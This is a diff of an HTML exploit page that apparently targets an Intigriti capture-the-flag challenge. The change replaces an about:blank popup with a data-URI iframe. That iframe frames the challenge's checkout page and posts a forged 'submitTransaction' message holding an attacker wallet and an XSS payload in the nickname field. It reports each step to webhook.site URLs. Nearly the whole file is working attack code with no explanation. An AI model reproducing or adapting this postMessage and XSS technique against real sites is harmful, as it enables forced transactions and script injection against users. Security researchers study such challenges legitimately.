@@ -1,58 +1,55 @@
 <!DOCTYPE html>
-<html><head><title>Blank Exploit</title></head>
+<html><head><title>Data Exploit</title></head>
 <body>
 <h2>Exploit</h2>
+<pre id=log></pre>
 <script>
-const WEBHOOK = 'https://webhook.site/f3aaf033-eed4-43c9-804b-9f0404dcded6';
+const WEBHOOK = 'https://webhook.site/159bea5f-e890-4760-b166-513ff8c724fc';
 const WALLET = '16472226db03703a192aa383237035a69f';
+const log = document.getElementById('log');
 
-fetch(WEBHOOK + '?s=1_START').catch(()=>{});
+function report(s) { log.textContent += '\n' + s; fetch(WEBHOOK + '?s=' + s).catch(()=>{}); }
 
-// Open about:blank (same-origin)
-const blank = window.open('about:blank', '_blank');
+report('1_START');
 
-if (blank) {
-    fetch(WEBHOOK + '?s=2_BLANK_OPENED').catch(()=>{});
-    
-    // Write HTML to the blank window
-    blank.document.write(`
-        <!DOCTYPE html>
-        <body>
-        <h3>Loading...</h3>
-        <iframe id="x" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none"></iframe>
-        <script>
-            const WEBHOOK = '${WEBHOOK}';
-            const WALLET = '${WALLET}';
+const iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+
+// Data URI - same-origin
+iframe.src = 'data:text/html,' + encodeURIComponent(`
+    <!DOCTYPE html>
+    <body>
+    <iframe id="x" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
+    <script>
+        const WEBHOOK = '${WEBHOOK}';
+        const WALLET = '${WALLET}';
+        
+        fetch(WEBHOOK + '?s=2_DATA_LOADED').catch(()=>{});
+        
+        document.getElementById('x').onload = function() {
+            fetch(WEBHOOK + '?s=3_IFRAME_LOADED').catch(()=>{});
             
-            fetch(WEBHOOK + '?s=3_IFRAME_IN_BLANK').catch(()=>{});
-            
-            document.getElementById('x').onload = function() {
-                fetch(WEBHOOK + '?s=4_IFRAME_LOADED').catch(()=>{});
+            setTimeout(function() {
+                this.contentWindow.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: WALLET,
+                        currency: '1337COIN',
+                        amount: 1,
+                        nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
+                    }
+                }, 'https://challenge-0126.intigriti.io');
                 
-                setTimeout(function() {
-                    document.getElementById('x').contentWindow.postMessage({
-                        type: 'submitTransaction',
-                        transaction: {
-                            toAddress: WALLET,
-                            currency: '1337COIN',
-                            amount: 1,
-                            nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
-                        }
-                    }, '*');
-                    
-                    fetch(WEBHOOK + '?s=5_POSTMESSAGE_SENT').catch(()=>{});
-                }, 2000);
-            };
-        <\/script>
-        </body>
-        </html>
-    `);
-    blank.document.close();
-    
-    fetch(WEBHOOK + '?s=2_WRITTEN').catch(()=>{});
-} else {
-    fetch(WEBHOOK + '?s=2_BLOCKED').catch(()=>{});
-}
+                fetch(WEBHOOK + '?s=4_POSTMESSAGE').catch(()=>{});
+            }, 2000);
+        };
+    <\/script>
+    </body>
+</html>
+`);
+
+document.body.appendChild(iframe);
+report('2_DATA_IFRAME_ADDED');
 </script>
 </body>
 </html>
